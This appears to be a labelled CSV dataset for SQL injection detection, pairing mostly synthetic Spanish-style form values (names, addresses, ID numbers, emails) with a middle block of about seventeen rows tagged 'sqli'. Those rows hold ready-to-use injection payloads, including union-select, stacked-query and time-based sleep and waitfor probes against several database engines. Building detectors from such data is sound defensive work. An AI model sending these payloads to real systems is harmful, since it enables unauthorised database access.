payload,length,attack_type
9.13956E+15,16,norm
valina,6,norm
yoselie,7,norm
pool echenique,14,norm
"calle holanda 146,",18,norm
"tres villas, las",16,norm
5.42674E+15,16,norm
patrica0,8,norm
mankowsk,8,norm
4a39c44a,8,norm
bow@whitepearlresort.pl,23,norm
01472954b,9,norm
adradas,7,norm
18417,5,norm
smelters,8,norm
tamboreo,8,norm
lamas,5,norm
sipperly.nakamoto@ceramicasmio.ht,33,norm
carretera 200 hasta km. 1 barra de mio 175,42,norm
manzanilla,10,norm
1.18171E+15,16,norm
jalaie,6,norm
1613,4,norm
joelly,6,norm
flaviano,8,norm
oshea_knowles@tiaherminia.gh,28,norm
"calle del llenguadoc s/n, 6e",28,norm
pujalt,6,norm
2.69448E+14,16,norm
kristel,7,norm
reiji,5,norm
estolano boget,14,norm
62145911a,9,norm
"travesia barrionuevo, 49",24,norm
7.73869E+15,16,norm
daisey,6,norm
2925,4,norm
doris,5,norm
bergad faix,11,norm
sibirskaia@euskalcasino.es,26,norm
"c/ lope de rueda s/n, 9-f",25,norm
alcntar,7,norm
lozier,6,norm
alguese,7,norm
30482828p,9,norm
"c/ ulises 17,",13,norm
rube,4,norm
enlutada,8,norm
blount,6,norm
sugesto,7,norm
suau,4,norm
germain@elcorteitaliano.cat,27,norm
"c/ de la sabina, s/n 8?b",24,norm
betelu,6,norm
mcglynn,7,norm
midkiff_mikuni@directoriogratuito.kh,36,norm
"calle rascafria, 103,",21,norm
gimialcn,8,norm
3.5822E+15,16,norm
sprouse,7,norm
1827,4,norm
addons,6,norm
karla,5,norm
jauregui cortines,17,norm
86800649y,9,norm
"paratge lila 30, 10?c",21,norm
9.09145E+15,16,norm
dyck,4,norm
pereda barrio,13,norm
barrymore@hipermadrid.pe,24,norm
"doctor waksmann, 120, 7?b",25,norm
caudete,7,norm
3.16175E+15,16,norm
chao,4,norm
4403,4,norm
patacki,7,norm
xifr,4,norm
pleasande@doloresmusculares.aq,30,norm
"sanchez 49,",11,norm
9.00808E+15,16,norm
o+bispar,8,norm
adgardo,7,norm
36914497a,9,norm
"nucleo santiago apostol 34, 4?f",31,norm
20491,5,norm
4.81172E+15,16,norm
inord2n6da7e401,15,norm
5445,4,norm
a65esad0,8,norm
efrn,4,norm
calle castaos 90,16,norm
torre-cardela,13,norm
4.86728E+15,16,norm
oran,4,norm
tesisteco avi,13,norm
pepet@naturalchild.co,21,norm
1308,5,norm
6.70256E+15,16,norm
remante,7,norm
919,3,norm
afoscarse,9,norm
net.valdez@salaparis.gt,23,norm
"c/ja del indiano, s/n,",22,norm
illano,6,norm
2.87295E+15,16,norm
spears,6,norm
triana,6,norm
del ngel kercad,15,norm
10421521z,9,norm
"etorbidea askatasuna 170, 8?a",29,norm
2.75401E+15,16,norm
huong,5,norm
1729,4,norm
tse,3,norm
victoria de los angeles,23,norm
ventura motn,12,norm
"roure, 43, 3?d",14,norm
32648,5,norm
meggy,5,norm
3o22ciabl3,10,norm
ayat rozas,10,norm
verani@viajesdacapalla.gq,25,norm
"quinita flores 75,",18,norm
botarell,8,norm
3.89386E+15,16,norm
etchieso,8,norm
9159,4,norm
marieann,8,norm
penarroya ingla,15,norm
gayle@freetag.name,18,norm
"el halcon 154, 8?f",18,norm
3314,5,norm
evin,4,norm
sa6r2,5,norm
gorcy.davis@carmensanmartin.bo,30,norm
16601924h,9,norm
destriana,9,norm
25307,5,norm
9639,4,norm
longo,5,norm
armero filippi,14,norm
uzaki@23horas.ie,16,norm
24391,5,norm
lei-see,7,norm
rahue,5,norm
serna kovac,11,norm
51795949h,9,norm
"calle del derecho 17,",21,norm
50693,5,norm
9.47354E+15,16,norm
7a2a6t1ro,9,norm
1858,4,norm
pavorde,7,norm
elois,5,norm
terrio@likeanangel.dz,21,norm
46773841y,9,norm
arndiga,7,norm
8.55461E+15,16,norm
muntaner nevado,15,norm
vasilescu.lisi@drogasvirtuales.sc,33,norm
"luis braille, 33, 12?d",22,norm
matar,5,norm
4.60806E+15,16,norm
werling,7,norm
7012,4,norm
barnhill,8,norm
quintilio,9,norm
naharro,7,norm
38980059g,9,norm
"calle isis, 180",15,norm
6.1724E+15,16,norm
janeva,6,norm
lzaro,5,norm
hinwood-laretei@addl.es,23,norm
canfranc,8,norm
26323,5,norm
radioelctrica,13,norm
3679,4,norm
apotrerar,9,norm
mochn quer,10,norm
30503437d,9,norm
"carrer asturies, 49",19,norm
8.58253E+15,16,norm
aghili,6,norm
colunga corrius,15,norm
bukoontot@google-movil.cm,25,norm
c/ asuncion 115 5e,18,norm
almonacid de la sierra,22,norm
rorke,5,norm
3u23pe,6,norm
philippa,8,norm
carroar,7,norm
schwab.carli@emepleo.info,25,norm
"calle batalla de muhlberg, 25, 6?a",34,norm
27860,5,norm
brenda,6,norm
alpar-ornstein@rockefeller.nu,29,norm
15423399j,9,norm
46844,5,norm
gourley,7,norm
consalve,8,norm
c406l2n5,8,norm
kunneke@storagecraft.nz,23,norm
89740217j,9,norm
igzquiza,8,norm
17867,5,norm
zandra,6,norm
agenor,6,norm
chamberlain@muevemiweb.al,25,norm
calle jaime ferranz 51,22,norm
12163,5,norm
"1' where 6406=6406;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",115,sqli
"1) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (4666=4666",111,sqli
1) where 7956=7956 or sleep(5)#,31,sqli
-7387'))) order by 1--,22,sqli
"1))) union all select null,null,null#",37,sqli
"-5622"" where 7970=7970 union all select 7970,7970,7970,7970,7970--",66,sqli
"-9860%"" union all select 6996,6996,6996,6996,6996,6996#",55,sqli
"1));select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and ((7240=7240",101,sqli
"1%""))) waitfor delay '0:0:5'--",30,sqli
"1"") as nraw where 7984=7984 and elt(3114=3114,sleep(5))#",56,sqli
"1%"");select benchmark(5000000,md5(0x714e4153))#",47,sqli
"1'))) or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",103,sqli
"-4259')) as usqu where 5419=5419 or elt(8325=8837,8837)--",57,sqli
"1')) and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (('ijyi'='ijyi",124,sqli
"-2583"") where 3455=3455 or make_set(9354=9354,7185)--",53,sqli
"-6267""))) or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (((""rqws""=""rqws",209,sqli
"1%'))) and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",69,sqli
8.49643E+15,16,norm
t324a3ra5a,10,norm
4932,4,norm
di0cut6dor7,11,norm
jener monaj,11,norm
los polancos 133,16,norm
"pintanos, los",13,norm
berrisfo,8,norm
zaguero,7,norm
39202408n,9,norm
"c/ montaer ruiz, 24, 12a",24,norm
3.60984E+15,16,norm
isador,6,norm
4906,4,norm
marcanti,8,norm
jezabel,7,norm
pawluszek segu,14,norm
05782219l,9,norm
"c/ ricardo codoer, 112,",23,norm
brunhild,8,norm
te3496,6,norm
allaert@chicasdiabolo.ru,24,norm
63974696n,9,norm
fla,3,norm
50629,5,norm
demostrar,9,norm
6212,4,norm
refriega,8,norm
isidoro,7,norm
06918701w,9,norm
"calle la caldera, 76 11-c",25,norm
4.89877E+15,16,norm
lap,3,norm
42287106l,9,norm
"calle beato tomas de zumarraga, 89 12-c",39,norm
olsen,5,norm
5urgui8a,8,norm
spindler1,9,norm
trincha-32r1,12,norm
08363269d,9,norm
"alqueria de pixarroda, 27",25,norm
2.77189E+14,16,norm
dotan,5,norm
terribas,8,norm
leftwich@sms24h.sb,18,norm
12232,5,norm
5.58043E+15,16,norm
comba,5,norm
1140,4,norm
e23i6gulo,9,norm
nicolo,6,norm
floor@aebo.af,13,norm
88341714w,9,norm
29639,5,norm
5.24225E+13,16,norm
nanni-prucnal@fighting-machines.gf,34,norm
08447437c,9,norm
46510,5,norm
8.78248E+14,16,norm
973,3,norm
merl,4,norm
quintn,6,norm
bricat,6,norm
03046730n,9,norm
"ronda sant antoni maria claret 144,",35,norm
jawad,5,norm
92frico,7,norm
pipiolo sandrini,16,norm
velero@softwaresaas.ec,22,norm
"c/ barriada nueva andalucia, 79, 5?f",36,norm
lora,4,norm
anja,4,norm
3803,4,norm
descarada,9,norm
lian,4,norm
85640413m,9,norm
"c/ san juan bautista 66, 1?f",28,norm
24410,5,norm
1.71005E+15,16,norm
de la barca pitti,17,norm
dierking3@carmensanmartin.kn,28,norm
"diaz camacho 107, 2-a",21,norm
9.63656E+15,16,norm
trashumacin,11,norm
389,3,norm
hatajo,6,norm
yasna,5,norm
hymen_israeli@aulahost.vc,25,norm
"cami llorito, 38",16,norm
5.96812E+15,16,norm
bordin,6,norm
jeria cifr,10,norm
litchterman.steiner6@myalbum.by,31,norm
"calle costa de llevant, 52",26,norm
murillo el cuende,17,norm
ligurs,6,norm
retos9a1o,9,norm
braham,6,norm
wieth@camiones-hibridos.md,26,norm
"cami can rabella, s/n",21,norm
"manzano, el",11,norm
virchick1,9,norm
superable,9,norm
duran manero,12,norm
paris-loisel@viavilano.cr,25,norm
"burgos, s/n, 1f",15,norm
boimorto,8,norm
1.95911E+15,16,norm
cycelia,7,norm
1166,4,norm
swope,5,norm
gutman@latiendadecolchones.mn,29,norm
86626999y,9,norm
cubillas de santa marta,23,norm
10182,5,norm
raha,4,norm
de5pi6ar4za4,12,norm
sagu cnstenla,13,norm
santaniello_tabernero@enfuerteventura.com.ni,44,norm
plaza asociacion de la prensa 107,33,norm
segura de los baos,18,norm
reid5,5,norm
chimenea,8,norm
jailyn,6,norm
irado,5,norm
norring-fujikawa@autoconstruccion.au,36,norm
"plza. salamanca 39,",19,norm
50780,5,norm
2.78797E+15,16,norm
d060u2ar,8,norm
hania,5,norm
hesseman.dolen@gaudio.mu,24,norm
calle vallseca 123,18,norm
5.17668E+15,16,norm
guillory,8,norm
5155,4,norm
mcculloc,8,norm
iris,4,norm
duo_davalos@designworld.cz,26,norm
isla de cuba 85 3-b,19,norm
coripe,6,norm
zauhar,6,norm
semanera,8,norm
langellotti,11,norm
schaafsma@gay-tantra.sj,23,norm
villanueva del rebollar,23,norm
38450,5,norm
grimsley,8,norm
luego,5,norm
trampeador,10,norm
kovac,5,norm
"calle de can castellvi 35, 10-h",31,norm
vindel,6,norm
humfrid,7,norm
expendedora,11,norm
carvajal,8,norm
lightner.manor@rosaserigrafia.as,32,norm
castellnovo,11,norm
19127,5,norm
ania,4,norm
esmilcea,8,norm
huerfanidad,11,norm
robertino,9,norm
91220241x,9,norm
"jose gomez gallito, 107,",24,norm
32252,5,norm
5.77313E+14,16,norm
inoportunamente,15,norm
cibeles,7,norm
carminati@granbretana.com.uk,28,norm
33273113w,9,norm
munbrega,8,norm
4.61189E+15,16,norm
adapuesto,9,norm
3151,4,norm
9o52cardea7,11,norm
benito@mayoriasilenciosa.mu,27,norm
calle juan de sevilla 102 3c,28,norm
cabanabona,10,norm
kouhi,5,norm
4az,3,norm
78267819s,9,norm
"calle rendona 45, 5-a",21,norm
fady,4,norm
a8o8decer,9,norm
sonoe,5,norm
idalio,6,norm
portal tauler,13,norm
edlund@cementoscalibra.yu,25,norm
sant quirze de besora,21,norm
27784,5,norm
meier,5,norm
c6nte9osa,9,norm
buisn andres,12,norm
oliveira_aptekman@engibraltar.va,32,norm
san bartolom de la torre,24,norm
12510,5,norm
nadav6,6,norm
pent0et3o,9,norm
keer,4,norm
gala,4,norm
waggenheim@rubirubi.info,24,norm
55265136t,9,norm
45674,5,norm
2.99688E+15,16,norm
"torrent de can caralleu 48, 12-g",32,norm
telde,5,norm
7.74567E+15,16,norm
brain,5,norm
7242,4,norm
kalpak,6,norm
sixto,5,norm
peredo huecas,13,norm
21468433a,9,norm
"toril, 171 5h",13,norm
5.03614E+15,16,norm
edlene,6,norm
albiol,6,norm
blankenship@likeanangel.tc,26,norm
"calle jose espejo, 130, 12?a",28,norm
42148,5,norm
tom159,6,norm
3046,4,norm
ru5runears2,11,norm
leobaldo,8,norm
53087910t,9,norm
"zafiro, s/n 4?b",15,norm
50174,5,norm
wei-tsig8,9,norm
sabu@aridossanchez.lt,21,norm
"avinguda pinyana, 7 2-h",23,norm
6196,5,norm
4.78072E+15,16,norm
abellot*ada,11,norm
new,3,norm
donaldo,7,norm
castell sargatal,16,norm
58222899d,9,norm
"camino hoya mondongo, 124",25,norm
1267,5,norm
3.89278E+15,16,norm
coxcojita,9,norm
quiliano,8,norm
pombal 114 3?d,14,norm
puerto de bjar,14,norm
ramesh,6,norm
cane5o,6,norm
haroun,6,norm
lluv8os4,8,norm
vano branchadell,16,norm
02650843r,9,norm
pia de campos,13,norm
3.55661E+15,16,norm
en8relan3amien0o,16,norm
osteicoechea uslet,18,norm
60537126e,9,norm
"luis de gongora, 189",20,norm
mariana,7,norm
emblanquimiento,15,norm
sari7,5,norm
4m4or6711a662,13,norm
sebastian_ferdi@tintaultravioleta.mv,36,norm
95549133a,9,norm
baos de molgas,14,norm
28760,5,norm
monte9a,7,norm
sibila,6,norm
neugebauer@buscamoto.gw,23,norm
37246742j,9,norm
ciadoncha,9,norm
17744,5,norm
tiefenth,8,norm
i77ovar,7,norm
rini,4,norm
inobediecia,11,norm
matienzo gallifa,16,norm
69082096d,9,norm
estepa,6,norm
40151,5,norm
6r5int3805,10,norm
parmenia,8,norm
tarp@redstarz.asia,18,norm
don juan 126,12,norm
17403,5,norm
3.786E+15,16,norm
1112,4,norm
brion6,6,norm
gavald,6,norm
selk@inversioneolica.ee,23,norm
"c/ cal correu, 0,",17,norm
cbdar,5,norm
cal,3,norm
acrianzada,10,norm
victor juan,11,norm
ballasko@quehaces.mr,20,norm
"calle sierra del quintanar, 199 9-b",35,norm
gaianes,7,norm
ex074ico,8,norm
1230,4,norm
c0l0o4a,7,norm
bentez monill,13,norm
50159319e,9,norm
"antonio toledano, 78, 10?h",26,norm
49167,5,norm
uriah,5,norm
maestre camprubi,16,norm
eckstine@blueeyes.eu,20,norm
"guadalajara, 101 4-e",20,norm
venialbo,8,norm
6.91307E+15,16,norm
beland,6,norm
7192,4,norm
ryszard,7,norm
alarico,7,norm
nrez muriscot,13,norm
"logroo, 98, 5-d",15,norm
sant lloren savall,18,norm
9.58999E+15,16,norm
harty,5,norm
llobet,6,norm
brace4@velazquezlarraaga.kz,27,norm
"alcalde lopez rancao, 194, 3-e",30,norm
vilafams,8,norm
1.4996E+15,16,norm
mundy,5,norm
5642,4,norm
chan+quete,10,norm
zuiga urbina,12,norm
grandinetti@mariposasentudia.mm,31,norm
"cruz de caravaca, 177",21,norm
daimiel,7,norm
4.15946E+15,16,norm
valcourt,8,norm
dels,4,norm
brau ganfornina,15,norm
64721683m,9,norm
c/ francisco grande cobian 90 4-e,33,norm
41570,5,norm
5.06802E+15,16,norm
in85ecuacin,11,norm
1304,4,norm
irresolucin,11,norm
nemesio,7,norm
veronese@prestigecars.tv,24,norm
99020664y,9,norm
torrecilla del monte,20,norm
29620,5,norm
or5i6or6i686,12,norm
llull valls,11,norm
calle oxigeno 197,17,norm
costur,6,norm
7.48225E+15,16,norm
witney,6,norm
546,3,norm
kipnis,6,norm
aitor,5,norm
scanlon@theroxyblue.ng,22,norm
alcalde gregorio espino 165,27,norm
pozanco,7,norm
3.59695E+15,16,norm
dud,3,norm
henriquez femenias,18,norm
seymour@evelin.gn,17,norm
"c/ fray diego de cadiz, 50",26,norm
mombuey,7,norm
kiyohara,8,norm
47761an0i59r,12,norm
downs,5,norm
tapinga,7,norm
sunyer lleix,12,norm
abadia@comercioenlacalle.er,27,norm
"c/ carranque, 113 5?a",21,norm
45240,5,norm
kobeski,7,norm
prueba,6,norm
goyenaga,8,norm
lenya@fbi-criminal-network.com.mil,34,norm
cantaracillo,12,norm
40190,5,norm
sosa,4,norm
fraccionario,12,norm
trung,5,norm
fragmentar,10,norm
ricci@redhost.is,16,norm
89821319v,9,norm
palacios del arzobispo,22,norm
8.32244E+15,16,norm
reele.cto,9,norm
roussel@santacruzdelvoto.ws,27,norm
calle bernat de santa eugenia 90,32,norm
sariego,7,norm
onofredo,8,norm
domeable,8,norm
babar4,6,norm
cornisamen!to,13,norm
17652259n,9,norm
calle segismundo moret 93 1?a,29,norm
6.14375E+14,16,norm
racette,7,norm
puy,3,norm
borgeaud@enmenorca.com.om,25,norm
"jabeque, 86,",12,norm
relleu,6,norm
espavorida,10,norm
9564,4,norm
bez clua,8,norm
gretler-rinell@magadan.com.yu,29,norm
lugar grela 152 1?f,19,norm
19185,5,norm
soportador,10,norm
trilles aedo,12,norm
79365532f,9,norm
calle siete cerros 144,22,norm
pankiw,6,norm
f8rol5ra,8,norm
9a7bl1,6,norm
paucides,8,norm
selj@ebaz.travel,16,norm
plza. maimonides 197,20,norm
15873,5,norm
1.20453E+15,16,norm
grandlocua,10,norm
talavera panfili,16,norm
79140741h,9,norm
tierra 17,9,norm
34305,5,norm
9.30782E+15,16,norm
5469,4,norm
clarabel,8,norm
redmond-delcampe@biosaludsystems.do,35,norm
calle corinto 108,17,norm
ordinar,7,norm
edel,4,norm
costello_browallius@autoconstruccion.bt,39,norm
07375030b,9,norm
puebla de obando,16,norm
parman,6,norm
108,3,norm
ja3aln,6,norm
crisp vivo,10,norm
chopel@restauranteslaespadaa.bg,31,norm
ysero,5,norm
10380,5,norm
lukers,6,norm
ofere*nte,9,norm
faix,4,norm
bartowna@professionalhost.do,28,norm
"calle gola de perellonet, 196,",30,norm
albuixech,9,norm
ch9let_a,8,norm
1084,4,norm
e3c7i3tu3a,10,norm
alceo,5,norm
amsterdam@mailboxrussia.nz,26,norm
33371147x,9,norm
50004,5,norm
6.18738E+15,16,norm
comiso,6,norm
barker ropero,13,norm
02877417w,9,norm
calle villalon 13 1g,20,norm
9.11358E+14,16,norm
oucharek,8,norm
6721,4,norm
marcum3,7,norm
leda,4,norm
pifarre marola,14,norm
57401003h,9,norm
"juan xxii 24, 3?c",17,norm
46838,5,norm
7.49612E+15,16,norm
9mbaicin,8,norm
jovn,4,norm
seddon@7peines.es,17,norm
68035116n,9,norm
tors,4,norm
6.23954E+15,16,norm
a9tr8pfag4,10,norm
6501,4,norm
9a470ul0,8,norm
gaudencio,9,norm
clunes7@palodegolf.com.coop,27,norm
25559456q,9,norm
villamuriel de cerrato,22,norm
5.21272E+15,16,norm
4s2cu8e44,9,norm
"parque san adrian, 196, 5h",26,norm
torrija,7,norm
4337,4,norm
perih1lio,9,norm
gervasio,8,norm
young-kyun@forohh.cl,20,norm
"jose muoz san roman, s/n,",25,norm
xavier,6,norm
tarasca,7,norm
c/ javea 57,11,norm
22470,5,norm
chabert,7,norm
chinchintor,11,norm
co01,4,norm
gierasch.casini@goovitae.cu,27,norm
13107,5,norm
8.23052E+15,16,norm
silcula,7,norm
juan de dios,12,norm
oleilnikov_balasko@hostprofessional.ac,38,norm
84996241v,9,norm
villarejo-periesteban,21,norm
47172,5,norm
414rd7f132o,11,norm
3614,4,norm
e561o,5,norm
culler castanyer,16,norm
54925627v,9,norm
"c/ obispo alonso suarez, 163,",29,norm
34347,5,norm
6.5524E+15,16,norm
indis6r4cin,11,norm
damacia,7,norm
signoret@pisossantcugat.cat,27,norm
78153384m,9,norm
"carpio de tajo, el",18,norm
49280,5,norm
mgi4a,5,norm
7896,4,norm
2isopada,8,norm
berroteran,10,norm
87258503e,9,norm
"carrera 55,",11,norm
16311,5,norm
9.26945E+15,16,norm
dra2atizar,10,norm
algu chavarri,13,norm
"calle miguel lopez de legazpi, 48, 8f",37,norm
50692,5,norm
kipp,4,norm
rob,3,norm
juneho,6,norm
retasac5n,9,norm
torreblanca pujades,19,norm
bellew@frioelectric.no,22,norm
madrazo 115,11,norm
sotalbo,7,norm
ayyuce,6,norm
broun_granlund@purplemoongrn.fi,31,norm
tauro 34 7b,11,norm
iznatoraf,9,norm
5.8041E+13,16,norm
lor81a5o,8,norm
ricard,6,norm
61z,3,norm
rigau amer,10,norm
pogam@soycatalan.aq,19,norm
orbita,6,norm
6.47051E+15,16,norm
re681g48rdia,12,norm
astor,5,norm
glazar@x2.com.net,17,norm
62746544z,9,norm
guadalcanal,11,norm
neils,5,norm
servitje areggiani,18,norm
rocheman@sindns.er,18,norm
"caada de los ingleses, 117,",27,norm
cantoria,8,norm
1.05984E+15,16,norm
fullum6,7,norm
crast_litel@cortell.al,22,norm
68689912k,9,norm
oliva,5,norm
45939,5,norm
trixie,6,norm
falerno,7,norm
2a6in6rosa,10,norm
poca urzagaste,14,norm
"infantes de carrion, 122",24,norm
8.58629E+14,16,norm
c944i6a,7,norm
rosset,6,norm
"calle teresa pamies i bertran 21,",33,norm
santa maria de corc,19,norm
papageno,8,norm
511amasa,8,norm
daren9,6,norm
acimentarse,11,norm
90660924f,9,norm
av. carlos marx s/n,19,norm
7.30906E+15,16,norm
lyle,4,norm
el khouri hausdorf,18,norm
darrieu@redstarz.sv,19,norm
"calle robregordo, 171 10-c",26,norm
andratx,7,norm
4.29603E+15,16,norm
revill5,7,norm
rigby,5,norm
pascuet landivar,16,norm
45053569l,9,norm
"duende, 138,",12,norm
40170,5,norm
491vi06a5,9,norm
35817134q,9,norm
19432,5,norm
reggis,6,norm
p5nderativa,11,norm
rurick5,7,norm
par4u8i67t3,11,norm
66702102d,9,norm
"comandante barja 84,",20,norm
2.27004E+14,16,norm
tewksbur,8,norm
rhys,4,norm
rigand@suncorp.mk,17,norm
"c/ pontevedra 25, 6a",20,norm
ferreruela,10,norm
7.20547E+14,16,norm
coursdev,8,norm
5966,4,norm
dorene6,7,norm
beiza ivanco,12,norm
butts@maxtienda.na,18,norm
"pesquera, la",12,norm
24152,5,norm
akio,4,norm
peng1in,7,norm
segu san marful,15,norm
knight_freihart@tresbrujas.qa,29,norm
"azorin, 167",11,norm
cuevas labradas,15,norm
semicopado,10,norm
8903,4,norm
m0nuta9,7,norm
domingo,7,norm
"plaa gabriela mistral, 140",26,norm
aldehuela del codonal,21,norm
mcduffie,8,norm
manganear,9,norm
dabbas hurtado,14,norm
76518142v,9,norm
ajamil,6,norm
5.67192E+14,16,norm
opopnaco,8,norm
4599,4,norm
cangrenarse,11,norm
pablo de la cruz,16,norm
jorey@20horas.ao,16,norm
37200229y,9,norm
piqueras,8,norm
5.35994E+15,16,norm
sanidad,7,norm
dalia,5,norm
13061311w,9,norm
"c/ angel ochotorena, 132, 10?b",30,norm
3.30924E+15,16,norm
darill,6,norm
4909,4,norm
mckibbon,8,norm
rolanda,7,norm
maynez giovannetti,18,norm
16824275m,9,norm
"cuesta pizarro 12, 4?d",22,norm
9737,5,norm
4.94812E+15,16,norm
cer97708or7,11,norm
montfort fiuza,14,norm
51620770f,9,norm
plza. euzkaltzandia 56 2-b,26,norm
18670,5,norm
5.56194E+15,16,norm
0nsu2iso,8,norm
6622,4,norm
pawley@santacruzdelvoto.vu,26,norm
"calle republique dominicana, 85",31,norm
37340,5,norm
6.02828E+15,16,norm
naca39,6,norm
rodolfo,7,norm
franey_travers@hayunmundoahifuera.br,36,norm
07441681p,9,norm
bolvir,6,norm
45222,5,norm
la_verne,8,norm
diafragmar,10,norm
chaddie,7,norm
t4ne0r84oso,11,norm
ramells lam,11,norm
handy.leleu@chevrolet-volt.gob,30,norm
"parque barranco de coquin 67, 8?d",33,norm
torres de barbus,16,norm
saree,5,norm
albuminmetro,12,norm
maracaja@telogis.ad,19,norm
"do cotaredo, 147 9e",19,norm
braden,6,norm
8167,4,norm
jazmn,5,norm
eastman@beesmer.lu,18,norm
"calle virgen de covadonga, 32",29,norm
iznate,6,norm
5h5c8,5,norm
ivonne,6,norm
pap@evelin.com.ly,17,norm
94629114f,9,norm
47319,5,norm
3.12382E+15,16,norm
inciertamente,13,norm
7016,4,norm
gauchaje,8,norm
artigas girut,13,norm
tharsis s/n 11?c,16,norm
collado villalba,16,norm
4.08582E+15,16,norm
roe,3,norm
praxila,7,norm
copleston-guerrasio@risiberia.ng,32,norm
vertavillo,10,norm
46714,5,norm
dehoff,6,norm
2o0eri23,8,norm
anchia,6,norm
s4pe9iorm9n8e,13,norm
ronnback.pitre@pro-isfv.nc,26,norm
trobos 39 4e,12,norm
34126,5,norm
steklasa,8,norm
pa,2,norm
botellas girbau,15,norm
48999460f,9,norm
"plaza diego herrera lorenzo, 148 8?e",36,norm
buky,4,norm
champ,5,norm
melucci,7,norm
fnico,5,norm
berba.andreguy4@campanasextractoras.sh,38,norm
18653468p,9,norm
segura,6,norm
34870,5,norm
17rgu1r7,8,norm
warwicke@discon.mm,18,norm
"plza. carmelo solis, 78, 4?g",28,norm
49123,5,norm
espina796,9,norm
1466,4,norm
llompart maydana,16,norm
rosic@faders.com.sn,19,norm
"calle alhondiga, 103, 12d",25,norm
condado de castilnovo,21,norm
7.56294E+15,16,norm
patchit,7,norm
silde,5,norm
moreras sort,12,norm
77000029p,9,norm
"esperanza, 189 10-g",19,norm
8.04948E+15,16,norm
petunia,7,norm
6737,4,norm
manica,6,norm
sabino,6,norm
porta aylagas,13,norm
04277567g,9,norm
"sol, 153",8,norm
9.23121E+15,16,norm
kirady,6,norm
fany,4,norm
nagel ordoes,12,norm
60613075w,9,norm
"pasaje magistrado salvador barbera 136,",39,norm
2.78007E+14,16,norm
ibarra,6,norm
378,3,norm
goodman4,8,norm
vinaixa calleiros,17,norm
juornneau@buscadordevideos.cr,29,norm
becilla de valderaduey,22,norm
7260,5,norm
476en9o9na5,11,norm
vartan,6,norm
kosanovic@discon.cg,19,norm
56702228y,9,norm
belalczar,9,norm
3.34856E+15,16,norm
he53e9ona,9,norm
7860,4,norm
cu2tre8a,8,norm
gilmartin,9,norm
